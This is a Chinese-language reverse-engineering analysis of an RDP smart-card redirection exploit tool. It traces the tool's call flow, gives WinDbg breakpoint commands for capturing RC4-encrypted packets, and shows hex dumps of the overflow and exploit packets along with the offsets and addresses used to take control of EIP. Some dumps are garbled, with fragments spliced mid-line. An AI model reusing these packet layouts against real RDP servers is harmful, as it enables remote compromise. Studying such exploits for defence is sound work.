    ààconnect2RDP
    ààregisterCallback(CallBackFunction)
    à RecvProcessSendPackets
    à RdpLib_SendKeyStrokes // 发送空格
    à RecvProcessSendPackets
    à buildExpBuffer
    ààbuild_all_x86
    àààbuild_overflow_x86
    àààbuild_exploit_x86
    àààbuild_egg0_x86
    ààà// 设置认证码, 异或掩码, 打开载荷, etc
    ààà build_egg1_payloadxxx
    à RdpLib_SendKeyStrokes // 发送回车
    à RecvProcessSendPackets
    …
    à RecvProcessSendPackets
    àà//发送智能卡认证重定向请求，接收和处理响应，与服务器端进行交互，随后发送ExpBuffer(包含overflow buffer, exploit 和 egg0 buffer)在服务器端控制EIP，最后发送结束响应给服务器端完成第一阶段利用。
    àà//to be mentioned, 注册的回调函数connect2Target会被用来处理响应和打印一些类似与 “SELECT_FILE – GPK Card MF”, “GET_RESPONSE – data unit size”, “GET_RESPONSE – serial number”的日志.
我们发现在准备阶段，完成了与目标机器的连接和构建漏洞利用数据包。RecvProcessSendPackets被多次调用用于接收和处理服务器端的响应、并根据响应来发送数据。RecvProcessSendPackets完成了与RDP服务器端利用智能卡交互的所有细节，我们会在接下来的章节中详细阐述。当然，我们会注重函数如何构造数据包而不会阐述函数的细节。
**缓冲区溢出数据包分析**
在构造用于溢出的数据包的时，仅有两个字段是有实际意义的：偏移为0x8d中的值、偏移为0x91值（0x9000），其他字段都是填充的随机数据。
为了观察客户端发送的完整的数据，我们查看了发送的用于溢出的数据包。
如前面章节所述，在偏移为0x51，名为TS_INFO_PACKET被加密过了。我们观察到了客户端中用来加密TS_INFO_PACKET数据的函数为Libeay32!RC4
function。
我们可以通过简单的调试获取到了RC4解密的函数原型RC4 function — RC4(key, len, in, out)
通过在解密函数前后下断点，可以得到加密前的数据和加密后的数据。
    bu image00380000+0xab24 “.echo len;dc esp+10 L1;.echo rc4_in_buffer;dc poi(esp+8);gc”
    bu image00380000+0xab39 “.echo rc4_out_buffer;dc poi(esp+0c);gc”
下面我们给出TS_INFO_PACKET的内容
    len
    0178cf98  000000fc                             ….
    encrypted
    038e8d6b  0649efba dcb9b66b f63f676c a2ddcc3b  ..I.k…lg?.;…
    038e8d7b  56e1fb2e c9ed4e9c bf566979 4d9e3868  …V.N..yiV.h8.M
    038e8d8b  5dffb177 af4531e2 cd87df84 18a3afff  w..].1E………
    038e8d9b  56c96e10 7dd116d9 f1db47e2 b65bba04  .n.V…}.G….[.
    038e8dab  5d8892ca 324864cb 70bc4793 82be0c5b  …].dH2.G.p[…
    038e8dbb  d5737937 512ce129 21738638 ca18a61a  7ys.).,Q8.s!….
    038e8dcb  58a5f061 fe8af8db f6c40f83 a975c925  a..X……..%.u.
    038e8ddb  7da42561 8e0a740f b10381b2 ef4f3c00  a%.}.t…….CodePage
    00000003 ->Flags
    Device Control Response (DR_CONTROL_RSP)
    ->DeviceIoReply (16 bytes): DR_DEVICE_IOCOMPLETION
    4472 ->RDPDR_CTYP_CORE 0x4472
    4943 ->PAKID_CORE_DEVICE_IOCOMPLETION 0x4943
    00000000 ->DeviceId (4 bytes)
    00000001 ->CompletionId (4 bytes)
    00000000 ->IoStatus (4 bytes)
    000000e0 ->OutputBufferLength (4 bytes)
    ->OutputBuffer (variable)
    00081001 cccccccc Type Serialization Version 1 header
    000000c0 ->ObjectBufferLength (4 bytes)
    00000000 ->Filler (4 bytes)
    00000000 ->ReturnCode
    00000000 ->dwProtocol
    000000b2 ->cbRecvLength
    ->pbExtraBytes
    00000001 000000b2
    fce3940b f2c3bad3 7134f185 b595ac48
    2d8186ec 56e66ee1 ca0e854f e618d890
    fcf78fcf 6972d722 8a3307d7 e1715046
    6d3184f2 7eb82735 0c1d6f4b e6a262fe
继续执行程序，随后我们从内存中dump出了触发缓冲区溢出的两个关键字段
    WINDBG>dc 04fdd650+8d
    04fdd6dd  080190dc 00009000 d7d93015 9dd1e4b1  .........0......
地址0x080190dc我们在前面的章节介绍过，不再阐述。
**漏洞利用数据包分析**
在构造数据包的过程中，我们发现了一些有趣的字段，如0x11111111, 0x22222222和0x7ffe0300
我们使用解密缓冲区溢出数据包的方法解密漏洞利用数据包，得到
    encrypted
    038e9d83  0d76b81e 51331ed0 b3b4b29d ba4a1aaa  ..v…3Q……J.
    038e9d93  ad0b26e1 c15daa1e 20079871 a18afe91  .&….].q.. ….
    038e9da3  46d26828 a8883de7 8b54718e 33ebf243  (h.F.=…qT.C..3
    038e9db3  9d3d556b f8a4f6f8 4a29500c 5d06bd19  kU=……P)J…]
    038e9dc3  e6099604 4bc7dc66 92103b5e 6da27faa  ….f..K^;…..m
    038e9dd3  07420e27 c95b5664 79d50284 f7bbd1d3  ‘.B.dV[….y….
    038e9de3  79c389e1 f795e1cf bcb35b4d 69d0ef0c  …y….M[…..i
    038e9df3  92beeadf 9010b061 763848d5 bc032358  ….a….H8vX#..
    …
    Decrypted
    038e9d83  00000204 00000003 49434472 00000000  ……..rDCI….
    038e9d93  00000001 00000000 000001f0 00081001  …………….
    038e9da3  cccccccc 000001d0 00000000 00000000  …………….
    038e9db3  00000000 000001c0 00000001 000001c0  …………….
    038e9dc3  ada0d86e 08011e7a 0801118e 08005e85  n…z……..^..
    038e9dd3  0800bedd 11111111 2a6bd248 972dc73e  ……..H.k*>.-.
    038e9de3  00000000 6431e6f0 08011fef 08019078  ……1d….x…
    038e9df3  abc45491 22222222 00000000 316f482f  .T..””””…./Ho1
    …
漏洞利用数据包，也是一个Device Control
Response(DR_CONTROL_RSP)，应为设置了标志为DR_DEVICE_IOCOMPLETION
(0x49434472)。这和之前描述的缓冲区溢出的数据包一致。
第一阶段最后两个数据包是Select_MF和End Response。这里我们只展示被解密后的数据。
    len
    0178cf98  0000004c                             L…
    plain
    038ead9b  00000044 00000003 49434472 00000000  D…….rDCI….
    038eadab  00000001 00000000 00000030 00081001  ……..0…….
    038eadbb  cccccccc 00000010 00000000 00000000  …………….
    038eadcb  00000000 00000002 00000001 00000002  …………….
    038eaddb  00000090 00000000 00000000